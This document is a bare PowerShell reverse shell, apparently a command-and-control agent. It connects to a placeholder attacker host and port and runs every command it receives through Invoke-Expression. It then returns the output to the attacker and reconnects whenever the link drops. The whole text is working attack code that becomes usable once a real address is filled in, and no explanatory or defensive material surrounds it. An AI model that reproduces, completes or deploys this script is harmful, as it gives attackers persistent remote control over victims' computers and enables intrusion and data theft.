$server = "ATTACKER_IP"
$port = ATTACKER_PORT

function Connect-C2 {
    try {
        $tcpClient = New-Object System.Net.Sockets.TcpClient($server, $port)
        $networkStream = $tcpClient.GetStream()

        while ($true) {
            # Read command from C2
            $buffer = New-Object byte[] 1024
            $bytesRead = $networkStream.Read($buffer, 0, $buffer.Length)
            $command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead).Trim()

            # Log the received command
            Write-Host "Received command: $command"

            # Execute the command
            $result = Invoke-Expression $command | Out-String

            # Log the result
            Write-Host "Command result: $result"

            # Send the result back to C2
            $resultBytes = [System.Text.Encoding]::ASCII.GetBytes($result)
            $networkStream.Write($resultBytes, 0, $resultBytes.Length)
            $networkStream.Flush()
        }
    } catch {
        # Log the error
        Write-Host "Error occurred: $_"

        # Retry connection after a delay if the connection fails
        Start-Sleep -Seconds 5
        Connect-C2
    }
}

Connect-C2
